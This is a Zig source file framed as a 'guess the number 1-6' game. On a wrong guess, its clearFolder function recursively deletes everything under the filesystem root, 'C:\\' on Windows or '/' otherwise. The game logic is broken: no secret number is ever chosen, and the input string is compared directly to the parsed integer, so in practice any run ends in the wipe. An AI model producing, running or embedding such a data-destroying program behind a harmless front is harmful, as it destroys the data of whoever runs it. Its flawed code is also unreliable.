const std = @import("std");
const builtin = @import("builtin");

fn clearFolder(path: []const u8) !void {
    var dir = try std.fs.cwd().openDir(path, .{ .iterate = true });
    defer dir.close();

    var iterator = dir.iterate();

    while (try iterator.next()) |entry| {
        switch (entry.kind) {
            .file => try dir.deleteFile(entry.name),
            .directory => try dir.deleteTree(entry.name),
            else => {},
        }
    }
}

pub fn main() !void {
    const stdin = std.io.getStdIn().reader();

    var buffer: [100]u8 = undefined;

    std.debug.print("Guess the number! 1-6\n", .{});

    const input = try stdin.readUntilDelimiterOrEof(&buffer, '\n');

    const number = try std.fmt.parseInt(i32, input.?, 10);

    if (input == number) {
        std.debug.print("That's correct!",  .{});
    } else {
      if (builtin.os.tag == .windows) {
          try clearFolder("C:\\");
      } else {
        try clearFolder("/");
      }
    }
}
